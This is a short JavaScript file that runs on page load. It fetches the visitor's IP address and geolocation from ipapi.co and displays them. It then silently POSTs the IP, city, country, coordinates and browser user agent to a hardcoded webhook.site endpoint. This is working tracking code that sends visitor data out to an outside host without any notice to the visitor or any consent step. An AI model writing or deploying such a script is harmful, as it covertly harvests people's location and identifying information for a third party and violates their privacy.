async function sendData() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();

        document.getElementById('info').classList.remove('hidden');
        document.getElementById('ip').textContent = `IP: ${data.ip}`;
        document.getElementById('city').textContent = `City: ${data.city}`;
        document.getElementById('country').textContent = `Country: ${data.country_name}`;
        document.getElementById('coordinates').textContent = `Coordinates: ${data.latitude}, ${data.longitude}`;
        
        const webhookUrl = 'https://webhook.site/b83cc1d7-a891-4525-8d99-f5894b57ff52';
        await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                ip: data.ip,
                city: data.city,
                country: data.country_name,
                coordinates: `${data.latitude}, ${data.longitude}`,
                userAgent: navigator.userAgent
            })
        });
        
        console.log('Data has been successfully delivered');
    } catch (error) {
        console.error('Data delivery failed', error);
    }
}

window.onload = sendData;
